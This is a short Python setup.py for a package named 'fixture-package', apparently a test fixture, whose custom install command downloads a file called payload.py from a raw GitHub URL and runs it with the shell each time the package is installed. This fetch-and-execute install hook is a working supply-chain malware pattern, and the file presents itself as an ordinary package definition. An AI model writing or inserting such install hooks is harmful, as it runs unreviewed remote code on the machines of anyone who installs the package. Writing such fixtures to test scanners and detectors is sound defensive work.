import requests
import subprocess
from setuptools import setup
from setuptools.command.install import install


class InstallPayload(install):
    def run(self):
        url = "https://raw.githubusercontent.com/example/project/main/payload.py"
        response = requests.get(url)
        with open("payload.py", "wb") as output:
            output.write(response.content)
        subprocess.call("python payload.py", shell=True)
        install.run(self)


setup(name="fixture-package", cmdclass={"install": InstallPayload})
